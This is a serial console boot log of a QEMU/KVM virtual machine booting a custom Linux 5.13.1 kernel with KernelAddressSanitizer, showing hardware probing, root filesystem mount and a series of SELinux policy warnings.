qemu-system-x86_64: warning: host doesn't support requested feature: CPUID.80000001H:ECX.svm [bit 2]
qemu-system-x86_64: warning: host doesn't support requested feature: CPUID.80000001H:ECX.svm [bit 2]
c[?7l[2J[0mSeaBIOS (version 1.15.0-1)


iPXE (https://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7FF8B310+7FECB310 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM...
c[?7l[2JWrong EFI loader signature.
early console in extract_kernel
input_data: 0x000000000460d40d
input_len: 0x000000000147b99b
output: 0x0000000001000000
output_len: 0x0000000004a1d838
kernel_total_size: 0x0000000004630000
needed_size: 0x0000000004c00000
trampoline_32bit: 0x000000000009d000
Physical KASLR using RDTSC...
Virtual KASLR using RDTSC...

Decompressing Linux... Parsing ELF... Performing relocations... done.
Booting the kernel.
[    0.000000] Linux version 5.13.1 (vm@kdbg) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #1 SMP Mon Jul 25 08:50:08 KST 2022
[    0.000000] Command line: console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0
[    0.000000] x86/fpu: x87 FPU will use FXSAVE
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] printk: bootconsole [earlyser0] enabled
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: cpu 0, msr 6fa6e001, primary cpu clock
[    0.000023] kvm-clock: using sched offset of 748922086 cycles
[    0.002645] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.011526] tsc: Detected 2803.202 MHz processor
[    0.015668] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.019446] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.030600] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.037683] ACPI: Early table checksum verification disabled
[    0.041661] ACPI: RSDP 0x00000000000F59E0 000014 (v00 BOCHS )
[    0.044593] ACPI: RSDT 0x000000007FFE1960 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.048957] ACPI: FACP 0x000000007FFE180C 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.053898] ACPI: DSDT 0x000000007FFE0040 0017CC (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.057952] ACPI: FACS 0x000000007FFE0000 000040
[    0.059922] ACPI: APIC 0x000000007FFE1880 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.063983] ACPI: HPET 0x000000007FFE1900 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.068760] ACPI: WAET 0x000000007FFE1938 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.073433] ACPI: Reserving FACP table memory at [mem 0x7ffe180c-0x7ffe187f]
[    0.077580] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe180b]
[    0.081546] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.085544] ACPI: Reserving APIC table memory at [mem 0x7ffe1880-0x7ffe18ff]
[    0.089535] ACPI: Reserving HPET table memory at [mem 0x7ffe1900-0x7ffe1937]
[    0.093339] ACPI: Reserving WAET table memory at [mem 0x7ffe1938-0x7ffe195f]
[    0.098528] No NUMA configuration found
[    0.100691] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.104101] NODE_DATA(0) allocated [mem 0x7ffdc000-0x7ffdffff]
[    0.107819] Zone ranges:
[    0.109251]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.112717]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.116200]   Normal   empty
[    0.117810] Movable zone start for each node
[    0.120222] Early memory node ranges
[    0.122216]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.125576]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.129133] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.136027]   DMA zone: 28770 pages in unavailable ranges
[    0.182686]   DMA32 zone: 32 pages in unavailable ranges
[    0.505053] kasan: KernelAddressSanitizer initialized
[    0.509698] ACPI: PM-Timer IO Port: 0x608
[    0.512038] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.515667] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.519400] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.522990] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.526714] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.530506] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.533831] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.537458] Using ACPI (MADT) for SMP configuration information
[    0.541133] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.544604] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.548196] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.552661] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.556872] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.561095] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.565203] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.568566] Booting paravirtualized kernel on KVM
[    0.571220] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.593754] setup_percpu: NR_CPUS:64 nr_cpumask_bits:64 nr_cpu_ids:2 nr_node_ids:1
[    0.601269] percpu: Embedded 60 pages/cpu s207512 r8192 d30056 u1048576
[    0.605664] kvm-guest: stealtime: cpu 0, msr 68c1f140
[    0.608687] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.612536] Policy zone: DMA32
[    0.614270] Kernel command line: console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0
[    0.622797] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.628129] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.633025] mem auto-init: stack:off, heap alloc:off, heap free:off
[    0.671800] Memory: 1706364K/2096632K available (43022K kernel code, 7367K rwdata, 6848K rodata, 1928K init, 1748K bss, 390012K reserved, 0K cma-reserved)
[    0.680021] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.683834] Kernel/User page tables isolation: enabled
[    0.689010] rcu: Hierarchical RCU implementation.
[    0.691645] rcu: 	RCU event tracing is enabled.
[    0.694221] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.697970] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.702241] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.713680] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.718237] random: get_random_bytes called from start_kernel+0x1c6/0x370 with crng_init=0
[    0.751746] Console: colour VGA+ 80x25
[    0.758813] printk: console [ttyS0] enabled
[    0.758813] printk: console [ttyS0] enabled
[    0.762773] printk: bootconsole [earlyser0] disabled
[    0.762773] printk: bootconsole [earlyser0] disabled
[    0.768721] ACPI: Core revision 20210331
[    0.772500] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.779040] APIC: Switch to symmetric I/O mode setup
[    0.792467] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.796208] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2868113ab3c, max_idle_ns: 440795215545 ns
[    0.802405] Calibrating delay loop (skipped) preset value.. 5606.40 BogoMIPS (lpj=2803202)
[    0.803327] pid_max: default: 32768 minimum: 301
[    0.804564] LSM: Security Framework initializing
[    0.805417] SELinux:  Initializing.
[    0.806487] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.807338] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
Poking KASLR using RDTSC...
[    0.816463] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.817301] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.818376] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.819301] Spectre V2 : Mitigation: Full generic retpoline
[    0.820300] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.821332] Speculative Store Bypass: Vulnerable
[    0.822312] MDS: Vulnerable: Clear CPU buffers attempted, no microcode
[    0.878420] Freeing SMP alternatives memory: 40K
[    0.972797] smpboot: CPU0: Intel QEMU Virtual CPU version 2.5+ (family: 0xf, model: 0x6b, stepping: 0x1)
[    0.975144] Performance Events: unsupported Netburst CPU model 107 no PMU driver, software events only.
[    0.975677] rcu: Hierarchical SRCU implementation.
[    0.977968] smp: Bringing up secondary CPUs ...
[    0.978943] x86: Booting SMP configuration:
[    0.979306] .... node  #0, CPUs:      #1
[    0.082514] kvm-clock: cpu 1, msr 6fa6e041, secondary cpu clock
[    0.996461] kvm-guest: stealtime: cpu 1, msr 68d1f140
[    1.003819] smp: Brought up 1 node, 2 CPUs
[    1.004307] smpboot: Max logical packages: 1
[    1.005322] smpboot: Total of 2 processors activated (11212.80 BogoMIPS)
[    1.009892] devtmpfs: initialized
[    1.020697] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    1.026305] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    1.031222] PM: RTC time: 08:40:46, date: 2022-07-25
[    1.034998] NET: Registered protocol family 16
[    1.037908] audit: initializing netlink subsys (disabled)
[    1.041331] audit: type=2000 audit(1658738447.150:1): state=initialized audit_enabled=0 res=1
[    1.042664] thermal_sys: Registered thermal governor 'step_wise'
[    1.043300] thermal_sys: Registered thermal governor 'user_space'
[    1.045365] cpuidle: using governor menu
[    1.051905] ACPI: bus type PCI registered
[    1.055023] PCI: Using configuration type 1 for base access
[    1.076473] Kprobes globally optimized
[    1.079563] HugeTLB registered 2.00 MiB page size, pre-allocated 0 pages
[    1.084677] cryptomgr_test (28) used greatest stack depth: 30768 bytes left
[    1.092509] ACPI: Added _OSI(Module Device)
[    1.093344] ACPI: Added _OSI(Processor Device)
[    1.094302] ACPI: Added _OSI(3.0 _SCP Extensions)
[    1.095304] ACPI: Added _OSI(Processor Aggregator Device)
[    1.096327] ACPI: Added _OSI(Linux-Dell-Video)
[    1.097304] ACPI: Added _OSI(Linux-Lenovo-NV-HDMI-Audio)
[    1.098303] ACPI: Added _OSI(Linux-HPI-Hybrid-Graphics)
[    1.113469] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    1.119381] ACPI: Interpreter enabled
[    1.120463] ACPI: (supports S0 S3 S4 S5)
[    1.121302] ACPI: Using IOAPIC for interrupt routing
[    1.122432] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    1.124715] ACPI: Enabled 2 GPEs in block 00 to 0F
[    1.149876] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    1.150375] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    1.151487] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended PCI configuration space under this bridge.
[    1.153599] PCI host bridge to bus 0000:00
[    1.155311] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    1.156317] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    1.157311] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    1.158305] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    1.159303] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    1.160306] pci_bus 0000:00: root bus resource [bus 00-ff]
[    1.162350] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    1.174058] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    1.178205] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    1.181113] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    1.182864] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    1.183305] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    1.184307] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    1.185301] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    1.188150] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    1.190848] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    1.191339] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    1.194733] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    1.199779] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    1.207723] pci 0000:00:02.0: reg 0x18: [mem 0xfebb0000-0xfebb0fff]
[    1.221732] pci 0000:00:02.0: reg 0x30: [mem 0xfeba0000-0xfebaffff pref]
[    1.241196] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    1.242303] pci 0000:00:03.0: reg 0x10: [mem 0xfeb80000-0xfeb9ffff]
[    1.244301] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    1.250302] pci 0000:00:03.0: reg 0x30: [mem 0xfeb00000-0xfeb7ffff pref]
[    1.265707] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    1.267896] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    1.269974] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    1.271079] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    1.272550] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    1.279450] iommu: Default domain type: Translated 
[    1.282589] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    1.283298] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    1.283304] pci 0000:00:02.0: vgaarb: bridge control possible
[    1.285300] vgaarb: loaded
[    1.289890] SCSI subsystem initialized
[    1.294184] ACPI: bus type USB registered
[    1.296923] usbcore: registered new interface driver usbfs
[    1.300479] usbcore: registered new interface driver hub
[    1.303453] usbcore: registered new device driver usb
[    1.306646] pps_core: LinuxPPS API ver. 1 registered
[    1.309300] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    1.315384] PTP clock support registered
[    1.319766] Advanced Linux Sound Architecture Driver Initialized.
[    1.325088] NetLabel: Initializing
[    1.325304] NetLabel:  domain hash size = 128
[    1.326300] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    1.327748] NetLabel:  unlabeled traffic allowed by default
[    1.329842] PCI: Using ACPI for IRQ routing
[    1.333395] hpet: 3 channels of 0 reserved for per-cpu timers
[    1.334432] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    1.335299] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    1.339092] clocksource: Switched to clocksource kvm-clock
[    1.412716] VFS: Disk quotas dquot_6.6.0
[    1.414817] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    1.418562] pnp: PnP ACPI init
[    1.423470] pnp: PnP ACPI: found 6 devices
[    1.438927] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    1.443746] NET: Registered protocol family 2
[    1.447665] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    1.454579] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    1.458939] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    1.462433] TCP bind hash table entries: 16384 (order: 6, 262144 bytes, linear)
[    1.466179] TCP: Hash tables configured (established 16384 bind 16384)
[    1.469455] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.472722] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    1.476565] NET: Registered protocol family 1
[    1.480247] RPC: Registered named UNIX socket transport module.
[    1.483928] RPC: Registered udp transport module.
[    1.486590] RPC: Registered tcp transport module.
[    1.489272] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    1.495043] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    1.498515] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    1.502041] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    1.505941] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    1.509957] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    1.514305] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    1.517834] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    1.521242] pci 0000:00:01.0: Activating ISA DMA hang workarounds
[    1.524983] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    1.529813] PCI: CLS 0 bytes, default 64
[    1.532891] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2868113ab3c, max_idle_ns: 440795215545 ns
[    1.544275] Initialise system trusted keyrings
[    1.547931] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    1.568484] NFS: Registering the id_resolver key type
[    1.571666] Key type id_resolver registered
[    1.574079] Key type id_legacy registered
[    1.577482] 9p: Installing v9fs 9p2000 file system support
[    1.594736] Key type asymmetric registered
[    1.597292] Asymmetric key parser 'x509' registered
[    1.600245] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    1.604487] io scheduler mq-deadline registered
[    1.607078] io scheduler kyber registered
[    1.611769] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    1.616718] ACPI: button: Power Button [PWRF]
[    1.622891] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    1.627579] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    1.636594] Non-volatile memory driver v1.3
[    1.640109] Linux agpgart interface v0.103
[    1.663302] loop: module loaded
[    1.672270] scsi host0: ata_piix
[    1.676659] scsi host1: ata_piix
[    1.678526] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    1.682472] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    1.688244] e100: Intel(R) PRO/100 Network Driver
[    1.690374] e100: Copyright(c) 1999-2006 Intel Corporation
[    1.693558] e1000: Intel(R) PRO/1000 Network Driver
[    1.696386] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    1.851930] ata1.00: ATA-7: QEMU HARDDISK, 2.5+, max UDMA/100
[    1.854945] ata1.00: 4194304 sectors, multi 16: LBA48 
[    1.858408] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    1.866161] scsi 0:0:0:0: Direct-Access     ATA      QEMU HARDDISK    2.5+ PQ: 0 ANSI: 5
[    1.871692] scsi 0:0:0:0: Attached scsi generic sg0 type 0
[    1.876613] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    1.876874] sd 0:0:0:0: [sda] 4194304 512-byte logical blocks: (2.15 GB/2.00 GiB)
[    1.885053] sd 0:0:0:0: [sda] Write Protect is off
[    1.888543] sd 0:0:0:0: [sda] Write cache: enabled, read cache: enabled, doesn't support DPO or FUA
[    1.898394] sd 0:0:0:0: [sda] Attached SCSI disk
[    2.011052] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    2.014851] cdrom: Uniform CD-ROM driver Revision: 3.20
[    2.139209] sr 1:0:0:0: Attached scsi generic sg1 type 5
[    2.484611] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    3.183030] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    3.187766] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    3.193523] e1000e: Intel(R) PRO/1000 Network Driver
[    3.196935] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    3.201449] sky2: driver version 1.30
[    3.206758] ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
[    3.211478] ehci-pci: EHCI PCI platform driver
[    3.214405] ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
[    3.219455] ohci-pci: OHCI PCI platform driver
[    3.223187] uhci_hcd: USB Universal Host Controller Interface driver
[    3.228909] usbcore: registered new interface driver usblp
[    3.232534] usbcore: registered new interface driver usb-storage
[    3.237293] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    3.248019] serio: i8042 KBD port at 0x60,0x64 irq 1
[    3.252180] serio: i8042 AUX port at 0x60,0x64 irq 12
[    3.259729] rtc_cmos 00:05: RTC can wake from S4
[    3.268131] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    3.268975] rtc_cmos 00:05: registered as rtc0
[    3.276906] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    3.285388] device-mapper: ioctl: 4.45.0-ioctl (2021-03-22) initialised: dm-devel@redhat.com
[    3.292002] intel_pstate: CPU model not supported
[    3.295476] hid: raw HID events driver (C) Jiri Kosina
[    3.301454] usbcore: registered new interface driver usbhid
[    3.305003] usbhid: USB HID core driver
[    3.316182] Initializing XFRM netlink socket
[    3.320690] NET: Registered protocol family 10
[    3.329243] Segment Routing with IPv6
[    3.334641] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    3.339800] NET: Registered protocol family 17
[    3.344088] 9pnet: Installing 9P2000 support
[    3.347433] Key type dns_resolver registered
[    3.352280] IPI shorthand broadcast: enabled
[    3.356020] sched_clock: Marking stable (3274139486, 81514276)->(3641730353, -286076591)
[    3.364189] registered taskstats version 1
[    3.367418] Loading compiled-in X.509 certificates
[    3.375093] PM:   Magic number: 14:863:675
[    3.378978] vtconsole vtcon0: hash matches
[    3.382326] printk: console [netcon0] enabled
[    3.386156] netconsole: network logging started
[    3.391882] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    3.402280] kworker/u4:1 (70) used greatest stack depth: 28800 bytes left
[    3.410445] cfg80211: Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    3.415636] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    3.415925] ALSA device list:
[    3.420656] cfg80211: failed to load regulatory.db
[    3.426651]   No soundcards found.
[    3.699531] random: fast init done
[    3.923672] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    3.930763] md: Waiting for all devices to be available before autodetect
[    3.936033] md: If you don't use raid, use raid=noautodetect
[    3.939856] md: Autodetecting RAID arrays.
[    3.942420] md: autorun ...
[    3.944848] md: ... autorun DONE.
[    3.962041] EXT4-fs (sda): INFO: recovery required on readonly filesystem
[    3.967208] EXT4-fs (sda): write access will be enabled during recovery
[    4.146526] EXT4-fs (sda): recovery complete
[    4.154104] EXT4-fs (sda): mounted filesystem with ordered data mode. Opts: (null). Quota mode: none.
[    4.161788] VFS: Mounted root (ext4 filesystem) readonly on device 8:0.
[    4.169457] devtmpfs: mounted
[    4.181775] Freeing unused kernel image (initmem) memory: 1928K
[    4.187032] Write protecting the kernel read-only data: 53248k
[    4.208555] Freeing unused kernel image (text/rodata gap) memory: 2032K
[    4.217635] Freeing unused kernel image (rodata/data gap) memory: 1344K
[    4.223946] Run /sbin/init as init process
[    4.864694] SELinux:  Permission getrlimit in class process not defined in policy.
[    4.870171] SELinux:  Class process2 not defined in policy.
[    4.874689] SELinux:  Permission watch in class filesystem not defined in policy.
[    4.880328] SELinux:  Permission map in class file not defined in policy.
[    4.885766] SELinux:  Permission watch in class file not defined in policy.
[    4.891454] SELinux:  Permission watch_mount in class file not defined in policy.
[    4.896332] SELinux:  Permission watch_sb in class file not defined in policy.
[    4.901680] SELinux:  Permission watch_with_perm in class file not defined in policy.
[    4.908077] SELinux:  Permission watch_reads in class file not defined in policy.
[    4.914320] SELinux:  Permission map in class dir not defined in policy.
[    4.919892] SELinux:  Permission watch in class dir not defined in policy.
[    4.924795] SELinux:  Permission watch_mount in class dir not defined in policy.
[    4.930399] SELinux:  Permission watch_sb in class dir not defined in policy.
[    4.936307] SELinux:  Permission watch_with_perm in class dir not defined in policy.
[    4.942634] SELinux:  Permission watch_reads in class dir not defined in policy.
[    4.949152] SELinux:  Permission map in class lnk_file not defined in policy.
[    4.955307] SELinux:  Permission watch in class lnk_file not defined in policy.
[    4.961323] SELinux:  Permission watch_mount in class lnk_file not defined in policy.
[    4.967704] SELinux:  Permission watch_sb in class lnk_file not defined in policy.
[    4.973878] SELinux:  Permission watch_with_perm in class lnk_file not defined in policy.
[    4.980777] SELinux:  Permission watch_reads in class lnk_file not defined in policy.
[    4.986045] SELinux:  Permission map in class chr_file not defined in policy.
[    4.991869] SELinux:  Permission watch in class chr_file not defined in policy.
[    4.998080] SELinux:  Permission watch_mount in class chr_file not defined in policy.
[    5.004217] SELinux:  Permission watch_sb in class chr_file not defined in policy.
[    5.010467] SELinux:  Permission watch_with_perm in class chr_file not defined in policy.
[    5.017127] SELinux:  Permission watch_reads in class chr_file not defined in policy.
[    5.023246] SELinux:  Permission map in class blk_file not defined in policy.
[    5.029148] SELinux:  Permission watch in class blk_file not defined in policy.
[    5.034696] SELinux:  Permission watch_mount in class blk_file not defined in policy.
[    5.040509] SELinux:  Permission watch_sb in class blk_file not defined in policy.
[    5.046815] SELinux:  Permission watch_with_perm in class blk_file not defined in policy.
[    5.052359] SELinux:  Permission watch_reads in class blk_file not defined in policy.
[    5.058943] SELinux:  Permission map in class sock_file not defined in policy.
[    5.064538] SELinux:  Permission watch in class sock_file not defined in policy.
[    5.070448] SELinux:  Permission watch_mount in class sock_file not defined in policy.
[    5.076141] SELinux:  Permission watch_sb in class sock_file not defined in policy.
[    5.081304] SELinux:  Permission watch_with_perm in class sock_file not defined in policy.
[    5.087772] SELinux:  Permission watch_reads in class sock_file not defined in policy.
[    5.093845] SELinux:  Permission map in class fifo_file not defined in policy.
[    5.100055] SELinux:  Permission watch in class fifo_file not defined in policy.
[    5.106210] SELinux:  Permission watch_mount in class fifo_file not defined in policy.
[    5.111411] SELinux:  Permission watch_sb in class fifo_file not defined in policy.
[    5.117819] SELinux:  Permission watch_with_perm in class fifo_file not defined in policy.
[    5.124736] SELinux:  Permission watch_reads in class fifo_file not defined in policy.
[    5.131261] SELinux:  Permission map in class socket not defined in policy.
[    5.137257] SELinux:  Permission map in class tcp_socket not defined in policy.
[    5.143106] SELinux:  Permission map in class udp_socket not defined in policy.
[    5.148121] SELinux:  Permission map in class rawip_socket not defined in policy.
[    5.154618] SELinux:  Permission map in class netlink_socket not defined in policy.
[    5.161544] SELinux:  Permission map in class packet_socket not defined in policy.
[    5.167838] SELinux:  Permission map in class key_socket not defined in policy.
[    5.173911] SELinux:  Permission map in class unix_stream_socket not defined in policy.
[    5.180683] SELinux:  Permission map in class unix_dgram_socket not defined in policy.
[    5.187134] SELinux:  Permission map in class netlink_route_socket not defined in policy.
[    5.193933] SELinux:  Permission map in class netlink_tcpdiag_socket not defined in policy.
[    5.200716] SELinux:  Permission map in class netlink_nflog_socket not defined in policy.
[    5.207231] SELinux:  Permission map in class netlink_xfrm_socket not defined in policy.
[    5.213963] SELinux:  Permission map in class netlink_selinux_socket not defined in policy.
[    5.221239] SELinux:  Permission map in class netlink_iscsi_socket not defined in policy.
[    5.227339] SELinux:  Permission map in class netlink_audit_socket not defined in policy.
[    5.234104] SELinux:  Permission map in class netlink_fib_lookup_socket not defined in policy.
[    5.240763] SELinux:  Permission map in class netlink_connector_socket not defined in policy.
[    5.247671] SELinux:  Permission map in class netlink_netfilter_socket not defined in policy.
[    5.254577] SELinux:  Permission map in class netlink_dnrt_socket not defined in policy.
[    5.261190] SELinux:  Permission map in class netlink_kobject_uevent_socket not defined in policy.
[    5.268128] SELinux:  Permission map in class netlink_generic_socket not defined in policy.
[    5.274404] SELinux:  Permission map in class netlink_scsitransport_socket not defined in policy.
[    5.280819] SELinux:  Permission map in class netlink_rdma_socket not defined in policy.
[    5.287150] SELinux:  Permission map in class netlink_crypto_socket not defined in policy.
[    5.292904] SELinux:  Permission map in class appletalk_socket not defined in policy.
